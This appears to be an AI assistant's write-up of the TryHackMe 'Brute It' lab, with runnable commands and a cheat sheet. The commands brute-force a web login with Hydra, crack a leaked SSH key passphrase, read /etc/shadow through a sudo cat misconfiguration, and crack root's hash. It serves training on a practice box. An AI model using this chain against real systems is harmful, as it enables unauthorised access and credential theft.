Awesome work clearing **THM – Brute It**! Here are clean, reusable **notes + a step-by-step explanation** of the full attack chain so you can repeat the logic on other boxes.

---

# Brute It – Field Notes (with reasoning)

## 0) Setup

```bash
IP=<target_ip>

```

Keep a scratch file for commands/results:

```bash
mkdir -p bruteforce-notes && cd $_

```

---

## 1) Recon → Find exposed services

**Why:** You need an entry point (ports/services).

```bash
nmap -sC -sV -oN nmap_$IP.txt $IP

```

**What you expect on this room:** `22/tcp (ssh)` and `80/tcp (http)`. The web port is the pivot for creds. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

---

## 2) Web enum → Find hidden content

**Why:** Default web root often hides admin panels/files that reveal users/keys.

```bash
gobuster dir -u <http://$IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

```

**Target hit:** `/admin` (HTTP 301/200). That’s your credential gateway. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

**Tip:** If the page looks plain, **View Source**—sometimes it leaks form field names or hints you’ll need for Hydra.

---

## 3) Brute the web login (Hydra http-post-form)

**Why:** The admin login is guessable; you’ll brute the password for a known user.

1. Identify form details (from HTML/DevTools):

- POST path: `/admin/`
- Fields: `user`, `pass`
- Failure text: e.g., `invalid`

1. Hydra:

```bash
# rockyou.txt must be unzipped once: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP \\
  http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -t 6

```

- `l admin` = fixed username
    
- `^USER^` / `^PASS^` = Hydra placeholders
    
- `:invalid` = failure marker Hydra looks for
    
    When creds hit, Hydra prints: `login: admin password: <found>`. On this room the admin password is found this way. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))
    

**Common pitfalls**

- Wrong **failure string** → Hydra never “finds” success.
- Redirects after login are okay; Hydra follows them (you’ll see “Page redirected …” in output).

---

## 4) Loot the admin panel

**Why:** Post-auth pages often expose usernames, keys, or flags.

Actions inside panel (typical for this room):

- Note the **user name** you’ll later SSH as (e.g., `john`).
- Download the exposed **id_rsa** private key.
- Grab the **web flag** while you’re here. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

```bash
curl <http://$IP/admin/panel/id_rsa> -o id_rsa
chmod 600 id_rsa   # avoid "unprotected private key file" error

```

---

## 5) Crack the SSH key passphrase (ssh2john + john)

**Why:** The key is passphrase-protected; crack it to use over SSH.

```bash
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
# john --show id_rsa.hash    # to display once cracked

```

John recovers the passphrase used later to unlock the key. In the room’s flow, this is how you get the user shell. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

---

## 6) User shell via SSH (key + passphrase)

```bash
ssh -i id_rsa john@$IP
# Enter the cracked passphrase when prompted

```

Now collect **user.txt** from `john`’s home. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

---

## 7) Privilege escalation

**Why:** Check what root-level actions are allowed.

### 7.1 Sudo checks

```bash
sudo -l

```

On this room, `john` can run `/bin/cat` as root without password (NOPASSWD). That’s enough to **read anything**, including `/etc/shadow`. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

```bash
sudo cat /etc/shadow | grep '^root:'

```

### 7.2 Crack root’s hash (SHA-512)

Option A – **hashcat** (GPU/CPU):

```bash
# Save only the root hash (from first colon to next colon) into root.hash
hashcat -m 1800 -a 0 root.hash /usr/share/wordlists/rockyou.txt

```

Option B – **john**:

```bash
john --format=sha512crypt root.hash --wordlist=/usr/share/wordlists/rockyou.txt

```

When cracked, switch user:

```bash
su -   # or su root
# enter cracked password
whoami   # -> root

```

Then read **/root/root.txt**. ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))

---

# Why each step matters (portable logic)

- **Ports → Services**: You can’t choose tools until you know what’s listening.
- **Dirbusting**: Hidden web paths are the easiest way to discover creds/panels.
- **Hydra on forms**: If you have a fixed username (like `admin`) and a visible failure string, brute-forcing is straightforward.
- **Keys over creds**: Panels often leak SSH keys—always check for downloads / backups / exports.
- **ssh2john → john**: Any protected SSH key is fair game for cracking.
- **`sudo -l` first**: If you can run _any_ program as root (especially `cat`, `less`, `vim`, `find`, `tar`, etc.), you likely have a fast privesc.
- **Shadow → root**: If you can read `/etc/shadow`, you can usually crack root and finish.

---

# One-page cheat sheet (commands only)

```bash
# Recon
nmap -sC -sV -oN nmap_$IP.txt $IP

# Web enum
gobuster dir -u <http://$IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# Web brute (Hydra)
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP \\
  http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -t 6

# Loot key + crack passphrase
curl <http://$IP/admin/panel/id_rsa> -o id_rsa
chmod 600 id_rsa
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SSH
ssh -i id_rsa john@$IP

# Privesc
sudo -l
sudo cat /etc/shadow | grep '^root:' > root.hash
hashcat -m 1800 -a 0 root.hash /usr/share/wordlists/rockyou.txt
# or: john --format=sha512crypt root.hash --wordlist=/usr/share/wordlists/rockyou.txt
su -
cat /root/root.txt

```

---

# Common gotchas (and fixes)

- **Hydra finds nothing**
    
    - Recheck the **POST path**, **field names**, and especially the **failure string**.
    - Handle redirects; Hydra’s verbose output will show “Page redirected…”.
- **`rockyou.txt` missing** → unzip it:
    
    `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
    
- **SSH key “too open”** → `chmod 600 id_rsa`
    
- **Hashcat mode**: Linux SHA-512 `/etc/shadow` = `m 1800`
    
- **Rate limits/lockouts**: Use smaller wordlists first, add `t 3` in Hydra if needed.
    

---

If you want, I can turn this into a printable PDF or a one-page mind map of the **Brute It** chain. Also happy to adapt these notes to your exact run (drop your outputs if you want me to annotate them).

_(Key details of this specific room—like `/admin`, web brute to panel, leaked `id_rsa`, ssh2john/john, and sudo NOPASSWD→shadow→crack→root—match documented write-ups.)_ ([Medium](https://ricardojgribas.medium.com/tryhackme-brute-it-writeup-3efa9720dd83))